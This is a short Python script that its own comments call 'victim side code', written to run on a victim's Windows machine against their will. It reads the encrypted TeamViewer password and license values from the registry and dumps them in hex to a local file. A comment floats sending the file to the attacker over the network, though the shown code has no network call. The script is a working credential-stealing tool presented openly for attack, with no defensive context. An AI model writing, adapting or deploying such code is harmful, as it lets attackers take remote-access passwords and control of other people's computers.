# Victim side code 
# As an attacker, I want this to run on victim's windows machine, 
# agianst victim's will.
# Maybe I want to transmit "output" to attacker via network?
import winreg as reg
import json, os, sys
import codecs
    
key = reg.HKEY_LOCAL_MACHINE
target_prefix = "SOFTWARE\\WOW6432Node\\TeamViewer\\Version7"
op = reg.OpenKey(key, target_prefix, 0, reg.KEY_ALL_ACCESS)
targets = [
    "OptionsPasswordAES",
    "SecurityPasswordAES",
    "SecurityPasswordExported",
    "ServerPasswordAES",
    "ProxyPasswordAES",
    "LicenseKeyAES"
]
content = ""
for target in targets:
    try:
        val, typ = reg.QueryValueEx(op, target)
        val = val.hex()
        content += f"{target} {val}\n"
    except FileNotFoundError:
        continue
with codecs.open("output", "w", "utf-8-sig") as temp:
    temp.write(content)
    